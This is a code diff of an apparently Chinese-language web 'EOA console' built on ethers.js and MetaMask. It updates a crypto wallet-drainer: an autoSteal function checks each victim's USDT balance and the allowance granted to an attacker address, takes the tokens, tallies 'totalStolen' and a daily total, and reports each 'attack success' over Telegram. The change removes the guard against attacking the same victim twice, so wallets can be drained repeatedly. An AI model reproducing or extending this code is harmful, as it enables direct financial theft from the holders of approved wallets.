@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.7.3（修復連續攻擊 + Telegram通知）</title>
+  <title>🌟 EOA 控制台 v1.7.4（可連續攻擊 + Telegram + 日報）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -21,7 +21,7 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.7.3（修復連續攻擊 + Telegram通知）</h2>
+  <h2>🌟 EOA 控制台 v1.7.4（可連續攻擊 + Telegram + 日報）</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
@@ -60,11 +60,10 @@
 
     let provider, signer, sender;
     let totalStolen = ethers.BigNumber.from("0");
-    let todayTotal = ethers.BigNumber.from("0");
-    let todayDate = new Date().toLocaleDateString("zh-TW", { timeZone: "Asia/Taipei" });
     let autoEnabled = false;
-    const attackedSet = new Set();
     const knownApprovals = new Set();
+    let todayDate = new Date().toLocaleDateString("zh-TW", { timeZone: "Asia/Taipei" });
+    let todayTotal = ethers.BigNumber.from("0");
 
     async function connect() {
       provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -150,7 +149,6 @@
     }
 
     async function autoSteal(victim) {
-      if (attackedSet.has(victim)) return;
       const contract = new ethers.Contract(USDT, ABI, signer);
       const balance = await contract.balanceOf(victim);
       const allowance = await contract.allowance(victim, attacker);
@@ -166,7 +164,6 @@
         row.innerText = `✅ 成功 (${formatted} USDT)`;
         row.className = "ok";
       }
-      attackedSet.add(victim);
       await notifyAttackSuccess(victim, formatted, tx.hash);
     }
 
